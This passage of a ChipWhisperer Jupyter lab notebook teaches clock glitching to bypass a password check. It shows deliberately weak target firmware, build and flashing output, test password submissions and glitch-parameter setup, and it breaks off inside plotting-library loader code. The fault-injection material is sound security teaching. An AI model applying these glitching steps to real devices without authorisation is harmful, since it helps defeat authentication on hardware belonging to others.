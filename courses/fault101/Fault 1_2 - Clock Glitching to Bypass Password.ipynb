{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 1, Topic 2: Clock Glitching to Bypass Password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.\n",
    "\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**SUMMARY:** *In the previous lab, we learned how clock glitching can be used to cause a target to behave unexpectedly. In this lab, we'll look at a slightly more realistic example - glitching past a password check*\n",
    "\n",
    "**LEARNING OUTCOMES:**\n",
    "\n",
    "* Applying previous glitch settings to new firmware\n",
    "* Checking for success and failure when glitching"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware\n",
    "\n",
    "We've already seen how we can insert clock gliches to mess up a calculation that a target is trying to make. While this has many applications, some which will be covered in Fault_201, let's take a look at something a little closer to our original example of glitch vulnerable code: a password check. No need to change out firmware here, we're still using the simpleserial-glitch project (though we'll go through all the build stuff again).\n",
    "\n",
    "The code is as follows for the password check:\n",
    "\n",
    "```C\n",
    "uint8_t password(uint8_t* pw)\n",
    "{\n",
    "    char passwd[] = \"touch\";\n",
    "    char passok = 1;\n",
    "    int cnt;\n",
    "\n",
    "    trigger_high();\n",
    "\n",
    "    //Simple test - doesn't check for too-long password!\n",
    "    for(cnt = 0; cnt < 5; cnt++){\n",
    "        if (pw[cnt] != passwd[cnt]){\n",
    "            passok = 0;\n",
    "        }\n",
    "    }\n",
    "    \n",
    "    trigger_low();\n",
    "    \n",
    "    simpleserial_put('r', 1, (uint8_t*)&passok);\n",
    "    return passok;\n",
    "}\n",
    "```\n",
    "\n",
    "There's really nothing out of the ordinary here - it's just a simple password check. We can communicate with it using the `'p'` command."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEARM'\n",
    "SS_VER = 'SS_VER_2_1'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SS_VER set to SS_VER_2_1\n",
      "SS_VER set to SS_VER_2_1\n",
      "SS_VER set to SS_VER_2_1\n",
      "SS_VER set to SS_VER_2_1\n",
      "make[1]: '.dep' is up to date.\n",
      "SS_VER set to SS_VER_2_1\n",
      "SS_VER set to SS_VER_2_1\n",
      ".\n",
      "Welcome to another exciting ChipWhisperer target build!!\n",
      "arm-none-eabi-gcc (15:10.3-2021.07-4) 10.3.1 20210621 (release)\n",
      "Copyright (C) 2020 Free Software Foundation, Inc.\n",
      "This is free software; see the source for copying conditions.  There is NO\n",
      "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n",
      "\n",
      ".\n",
      "Assembling: .././hal/stm32f3/stm32f3_startup.S\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir-CWLITEARM/stm32f3_startup.lst -I.././simpleserial/ -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir-CWLITEARM/stm32f3_startup.o\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f3/stm32f3_sysmem.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     simpleserial-glitch.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f3/stm32f3_hal.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././simpleserial/simpleserial.c ...\n",
      "-e Done!\n",
      ".\n",
      "Compiling:\n",
      "-en     .././hal/stm32f3/stm32f3_hal_lowlevel.c ...\n",
      "-e Done!\n",
      ".\n",
      "LINKING:\n",
      "-en     simpleserial-glitch-CWLITEARM.elf ...\n",
      "-e Done!\n",
      ".\n",
      "Creating load file for Flash: simpleserial-glitch-CWLITEARM.hex\n",
      "arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CWLITEARM.elf simpleserial-glitch-CWLITEARM.hex\n",
      ".\n",
      "Creating load file for Flash: simpleserial-glitch-CWLITEARM.bin\n",
      "arm-none-eabi-objcopy -O binary -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CWLITEARM.elf simpleserial-glitch-CWLITEARM.bin\n",
      ".\n",
      "Creating load file for EEPROM: simpleserial-glitch-CWLITEARM.eep\n",
      "arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom=\"alloc,load\" \\\n",
      "--change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-glitch-CWLITEARM.elf simpleserial-glitch-CWLITEARM.eep || exit 0\n",
      ".\n",
      "Creating Extended Listing: simpleserial-glitch-CWLITEARM.lss\n",
      "arm-none-eabi-objdump -h -S -z simpleserial-glitch-CWLITEARM.elf > simpleserial-glitch-CWLITEARM.lss\n",
      ".\n",
      "Creating Symbol Table: simpleserial-glitch-CWLITEARM.sym\n",
      "arm-none-eabi-nm -n simpleserial-glitch-CWLITEARM.elf > simpleserial-glitch-CWLITEARM.sym\n",
      "SS_VER set to SS_VER_2_1\n",
      "SS_VER set to SS_VER_2_1\n",
      "Size after:\n",
      "   text\t   data\t    bss\t    dec\t    hex\tfilename\n",
      "   5828\t      8\t   1368\t   7204\t   1c24\tsimpleserial-glitch-CWLITEARM.elf\n",
      "+--------------------------------------------------------\n",
      "+ Default target does full rebuild each time.\n",
      "+ Specify buildtarget == allquick == to avoid full rebuild\n",
      "+--------------------------------------------------------\n",
      "+--------------------------------------------------------\n",
      "+ Built for platform CW-Lite Arm \\(STM32F3\\) with:\n",
      "+ CRYPTO_TARGET = NONE\n",
      "+ CRYPTO_OPTIONS = \n",
      "+--------------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$SS_VER\"\n",
    "cd ../../../hardware/victims/firmware/simpleserial-glitch\n",
    "make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO: Found ChipWhisperer😍\n",
      "scope.gain.mode                          changed from low                       to high                     \n",
      "scope.gain.gain                          changed from 0                         to 30                       \n",
      "scope.gain.db                            changed from 5.5                       to 24.8359375               \n",
      "scope.adc.basic_mode                     changed from low                       to rising_edge              \n",
      "scope.adc.samples                        changed from 24400                     to 5000                     \n",
      "scope.adc.trig_count                     changed from 11949547                  to 22981462                 \n",
      "scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4                \n",
      "scope.clock.adc_freq                     changed from 1411514                   to 41235557                 \n",
      "scope.clock.adc_rate                     changed from 1411514.0                 to 41235557.0               \n",
      "scope.clock.clkgen_div                   changed from 1                         to 26                       \n",
      "scope.clock.clkgen_freq                  changed from 192000000.0               to 7384615.384615385        \n",
      "scope.io.tio1                            changed from serial_tx                 to serial_rx                \n",
      "scope.io.tio2                            changed from serial_rx                 to serial_tx                \n",
      "scope.io.hs2                             changed from None                      to clkgen                   \n"
     ]
    }
   ],
   "source": [
    "%run \"../../Setup_Scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Detected known STMF32: STM32F302xB(C)/303xB(C)\n",
      "Extended erase (0x44), this can take ten seconds or more\n",
      "Attempting to program 5835 bytes at 0x8000000\n",
      "STM32F Programming flash...\n",
      "STM32F Reading flash...\n",
      "Verified flash OK, 5835 bytes\n"
     ]
    }
   ],
   "source": [
    "fw_path = \"../../../hardware/victims/firmware/simpleserial-glitch/simpleserial-glitch-{}.hex\".format(PLATFORM)\n",
    "cw.program_target(scope, prog, fw_path)\n",
    "if SS_VER == 'SS_VER_2_1':\n",
    "    target.reset_comms()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def reboot_flush():\n",
    "    reset_target(scope)\n",
    "    #Flush garbage too\n",
    "    target.flush()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If we send a wrong password:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'valid': True, 'payload': CWbytearray(b'00'), 'full_response': CWbytearray(b'00 72 01 00 99 00'), 'rv': bytearray(b'\\x00')}\n",
      "0\n"
     ]
    }
   ],
   "source": [
    "#Do glitch loop\n",
    "reboot_flush()\n",
    "pw = bytearray([0x00]*5)\n",
    "target.simpleserial_write('p', pw)\n",
    "\n",
    "val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check\n",
    "valid = val['valid']\n",
    "if valid:\n",
    "    response = val['payload']\n",
    "    raw_serial = val['full_response']\n",
    "    error_code = val['rv']\n",
    "\n",
    "print(val)\n",
    "payl = int.from_bytes(val['payload'], byteorder='little', signed=True)\n",
    "print(payl)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We get a response of zero. But if we send the correct password:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\\x00')}\n",
      "1\n"
     ]
    }
   ],
   "source": [
    "import struct\n",
    "#Do glitch loop\n",
    "reboot_flush()\n",
    "pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68]) # correct password ASCII representation\n",
    "target.simpleserial_write('p', pw)\n",
    "\n",
    "val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check\n",
    "valid = val['valid']\n",
    "if valid:\n",
    "    response = val['payload']\n",
    "    raw_serial = val['full_response']\n",
    "    error_code = val['rv']\n",
    "\n",
    "print(val)\n",
    "payl = int.from_bytes(val['payload'], byteorder='little', signed=True)\n",
    "print(payl)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We get a 1 back. Set the glitch up as in the previous part:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "scope.clock.adc_freq                     changed from 41235557                  to 31654140                 \n",
      "scope.clock.adc_rate                     changed from 41235557.0                to 31654140.0               \n",
      "clk_src     = clkgen\n",
      "width       = 10.15625\n",
      "width_fine  = 0\n",
      "offset      = 10.15625\n",
      "offset_fine = 0\n",
      "trigger_src = ext_single\n",
      "arm_timing  = after_scope\n",
      "ext_offset  = 0\n",
      "repeat      = 1\n",
      "output      = clock_xor\n",
      "\n"
     ]
    }
   ],
   "source": [
    "scope.cglitch_setup()\n",
    "print(scope.glitch)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Update the code below to also add an ext offset parameter:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0ebaf73a5de74b30b2de7d5c972f7971",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='success count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bfd7d2ab0b0b4d45bec396e35e5bf37f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='reset count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "68942d03327d470a9918fea4468ed897",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "IntText(value=0, description='normal count:', disabled=True)"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "27a46566394a4d5c886db668d7478349",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bc35aef20f3f451492430ed76e2ad0d2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "42b5a735a9914b369cafda5b1661062f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "gc = cw.GlitchController(groups=[\"success\", \"reset\", \"normal\"], parameters=[\"width\", \"offset\", \"ext_offset\"])\n",
    "gc.display_stats()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Like before, we'll plot our settings. The plot is 2D, so you'll need to make a decision about what to plot. In this case, we'll plot offset and ext_offset, but pick whichever you like:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "  var py_version = '3.2.1'.replace('rc', '-rc.').replace('.dev', '-dev.');\n",
       "  var is_dev = py_version.indexOf(\"+\") !== -1 || py_version.indexOf(\"-\") !== -1;\n",
       "  var reloading = false;\n",
       "  var Bokeh = root.Bokeh;\n",
       "  var bokeh_loaded = Bokeh != null && (Bokeh.version === py_version || (Bokeh.versions !== undefined && Bokeh.versions.has(py_version)));\n",
       "\n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks;\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, js_modules, js_exports, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "    if (js_modules == null) js_modules = [];\n",
       "    if (js_exports == null) js_exports = {};\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls.length === 0 && js_modules.length === 0 && Object.keys(js_exports).length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    if (!reloading) {\n",
       "      console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    }\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "    window._bokeh_on_load = on_load\n",
       "\n",
       "    function on_error() {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    var skip = [];\n",
       "    if (window.requirejs) {\n",
       "      window.requirejs.config({'packages': {}, 'paths': {'jspanel': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/jspanel', 'jspanel-modal': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/modal/jspanel.modal', 'jspanel-tooltip': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/tooltip/jspanel.tooltip', 'jspanel-hint': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/hint/jspanel.hint', 'jspanel-layout': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/layout/jspanel.layout', 'jspanel-contextmenu': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/contextmenu/jspanel.contextmenu', 'jspanel-dock': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/dock/jspanel.dock', 'gridstack': 'https://cdn.jsdelivr.net/npm/gridstack@7.2.3/dist/gridstack-all', 'notyf': 'https://cdn.jsdelivr.net/npm/notyf@3/notyf.min'}, 'shim': {'jspanel': {'exports': 'jsPanel'}, 'gridstack': {'exports': 'GridStack'}}});\n",
       "      require([\"jspanel\"], function(jsPanel) {\n",
       "\twindow.jsPanel = jsPanel\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"jspanel-modal\"], function() {\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"jspanel-tooltip\"], function() {\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"jspanel-hint\"], function() {\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"jspanel-layout\"], function() {\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"jspanel-contextmenu\"], function() {\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"jspanel-dock\"], function() {\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"gridstack\"], function(GridStack) {\n",
       "\twindow.GridStack = GridStack\n",
       "\ton_load()\n",
       "      })\n",
       "      require([\"notyf\"], function() {\n",
       "\ton_load()\n",
       "      })\n",
       "      root._bokeh_is_loading = css_urls.length + 9;\n",
       "    } else {\n",
       "      root._bokeh_is_loading = css_urls.length + js_urls.length + js_modules.length + Object.keys(js_exports).length;\n",
       "    }\n",
       "\n",
       "    var existing_stylesheets = []\n",
       "    var links = document.getElementsByTagName('link')\n",
       "    for (var i = 0; i < links.length; i++) {\n",
       "      var link = links[i]\n",
       "      if (link.href != null) {\n",
       "\texisting_stylesheets.push(link.href)\n",
       "      }\n",
       "    }\n",
       "    for (var i = 0; i < css_urls.length; i++) {\n",
       "      var url = css_urls[i];\n",
       "      if (existing_stylesheets.indexOf(url) !== -1) {\n",
       "\ton_load()\n",
       "\tcontinue;\n",
       "      }\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }    if (((window['jsPanel'] !== undefined) && (!(window['jsPanel'] instanceof HTMLElement))) || window.requirejs) {\n",
       "      var urls = ['https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/jspanel.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/modal/jspanel.modal.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/tooltip/jspanel.tooltip.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/hint/jspanel.hint.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/layout/jspanel.layout.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/contextmenu/jspanel.contextmenu.js', 'https://cdn.holoviz.org/panel/1.2.1/dist/bundled/floatpanel/jspanel4@4.12.0/dist/extensions/dock/jspanel.dock.js'];\n",
       "      for (var i = 0; i < urls.length; i++) {\n",
       "        skip.push(urls[i])\n",
       "      }\n",
       "    }    if (((window['GridStack'] !== undefined) && (!(window['GridStack'] instanceof HTMLElement))) || window.requirejs) {\n",
       "      var urls = ['https://cdn.holoviz.org/panel/1.2.1/dist/bundled/gridstack/gridstack@7.2.3/dist/gridstack-all.js'];\n",
       "      for (var i = 0; i < urls.length; i++) {\n",
       "        skip.push(urls[i])\n",
       "      }\n",
       "    }    if (((window['Notyf'] !== undefined) && (!(window['Notyf'] instanceof HTMLElement))) || window.requirejs) {\n",
       "      var urls = ['https://cdn.holoviz.org/panel/1.2.1/dist/bundled/notificationarea/notyf@3/notyf.min.js'];\n",
       "      for (var i = 0; i < urls.length; i++) {\n",
       "        skip.push(urls[i])\n",
       "      }\n",
       "    }    var existing_scripts = []\n",
       "    var scripts = document.getElementsByTagName('script')\n",
       "    for (var i = 0; i < scripts.length; i++) {\n",
       "      var script = scripts[i]\n",
       "      if (script.src != null) {\n",
       "\texisting_scripts.push(script.src)\n",
       "      }\n",
       "    }\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      if (skip.indexOf(url) !== -1 || existing_scripts.indexOf(url) !== -1) {\n",
       "\tif (!window.requirejs) {\n",
       "\t  on_load();\n",
       "\t}\n",
       "\tcontinue;\n",
       "      }\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "    for (var i = 0; i < js_modules.length; i++) {\n",
       "      var url = js_modules[i];\n",
       "      if (skip.indexOf(url) !== -1 || existing_scripts.indexOf(url) !== -1) {\n",
       "\tif (!window.requirejs) {\n",
       "\t  on_load();\n",
       "\t}\n",
       "\tcontinue;\n",
       "      }\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      element.type = \"module\";\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "    for (const name in js_exports) {\n",
       "      var url = js_exports[name];\n",
       "      if (skip.indexOf(url) >= 0 || root[name] != null) {\n",
       "\tif (!window.requirejs) {\n",
       "\t  on_load();\n",
       "\t}\n",
       "\tcontinue;\n",
       "      }\n",
       "      var element = document.createElement('script');\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.type = \"module\";\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      element.textContent = `\n",
       "      import ${name} from \"${url}\"\n",
       "      window.${name} = ${name}\n",
       "      window._bokeh_on_load()\n",
       "      `\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "    if (!js_urls.length && !js_modules.length) {\n",
       "      on_load()\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-3.2.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-3.2.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-3.2.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-3.2.1.min.js\", \"https://cdn.holoviz.org/panel/1.2.1/dist/panel.min.js\"];\n",
       "  var js_modules = [];\n",
       "  var js_exports = {};\n",
       "  var css_urls = [];\n",
       "  var inline_js = [    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "function(Bokeh) {} // ensure no trailing comma for IE\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    if ((root.Bokeh !== undefined) || (force === true)) {\n",
       "      for (var i = 0; i < inline_js.length; i++) {\n",
       "        inline_js[i].call(root, root.Bokeh);\n",
       "      }\n",
       "      // Cache old bokeh versions\n",
       "      if (Bokeh != undefined && !reloading) {\n",
       "\tvar NewBokeh = root.Bokeh;\n",
       "\tif (Bokeh.versions === undefined) {\n",
       "\t  Bokeh.versions = new Map();\n",
       "\t}\n",
       "\tif (NewBokeh.version !== Bokeh.version) {\n",
       "\t  Bokeh.versions.set(NewBokeh.version, NewBokeh)\n",
       "\t}\n",
       "\troot.Bokeh = Bokeh;\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    }\n",
       "    root._bokeh_is_initializing = false\n",
       "  }\n",
       "\n",
       "  function load_or_wait() {\n",
       "    // Implement a backoff loop that tries to ensure we do not load multiple\n",
       "    // versions of Bokeh and its dependencies at the same time.\n",
       "    // In recent versions we use the root._bokeh_is_initializing flag\n",
       "    // to determine whether there is an ongoing attempt to initialize\n",
       "    // bokeh, however for backward compatibility we also try to ensure\n",
       "    // that we do not start loading a newer (Panel>=1.0 and Bokeh>3) version\n",
       "    // before older versions are fully initialized.\n",
       "    if (root._bokeh_is_initializing && Date.now() > root._bokeh_timeout) {\n",
       "      root._bokeh_is_initializing = false;\n",
       "      root._bokeh_onload_callbacks = undefined;\n",
       "      console.log(\"Bokeh: BokehJS was loaded multiple times but one version failed to initialize.\");\n",
       "      load_or_wait();\n",
       "    } else if (root._bokeh_is_initializing || (typeof root._bokeh_is_initializing === \"undefined\" && root._bokeh_onload_callbacks !== undefined)) {\n",
       "      setTimeout(load_or_wait, 100);\n",
       "    } else {\n",
       "      Bokeh = root.Bokeh;\n",
       "      bokeh_loaded = Bokeh != null && (Bokeh.version === py_version || (Bokeh.versions !== undefined && Bokeh.versions.has(py_version)));\n",
       "      root._bokeh_is_initializing = true\n",
       "      root._bokeh_onload_callbacks = []\n",
       "      if (!reloading && (!bokeh_loaded || is_dev)) {\n",
       "\troot.Bokeh = undefined;\n",
       "      }\n",
       "      load_libs(css_urls, js_urls, js_modules, js_exports, function() {\n",
       "\tconsole.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "\trun_inline_js();\n",
       "      });\n",
       "    }\n",
       "  }\n",
       "  // Give older versions of the autoload script a head-start to ensure\n",
       "  // they initialize before we start loading newer version.\n",
       "  setTimeout(load_or_wait, 100)\n",
       "}(window));"
      ],
      "application/vnd.holoviews_load.v0+json": "(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n  var py_version = '3.2.1'.replace('rc', '-rc.').replace('.dev', '-dev.');\n  var is_dev = py_version.indexOf(\"+\") !== -1 || py_version.indexOf(\"-\") !== -1;\n  var reloading = false;\n  var Bokeh = root.Bokeh;\n  var bokeh_loaded = Bokeh != null && (Bokeh.version === py_version || (Bokeh.versions !== undefined && Bokeh.versions.has(py_version)));\n\n  if (typeof (root._bokeh_timeout) === \"undefined\" || force) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks;\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, js_modules, js_exports, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n    if (js_modules == null) js_modules = [];\n    if (js_exports == null) js_exports = {};\n\n    root._bokeh_onload_callbacks.push(callback);\n\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls.length === 0 && js_modules.length === 0 && Object.keys(js_exports).length === 0) {\n      run_callbacks();\n      return null;\n    }\n    if (!reloading) {\n      console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    }\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n    window._bokeh_on_load = on_load\n\n    function on_error() {\n      console.error(\"failed to load \" + url);\n    }\n\n    var skip = [];\n    if (window.requirejs) {\n      window.requirejs.config({'packages': {}, 'paths': {'jspanel': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/jspanel', 'jspanel-modal': 'https://cdn.jsdelivr.net/npm/jspanel4@4.12.0/dist/extensions/modal/jspanel.modal', 'jspanel-tooltip': 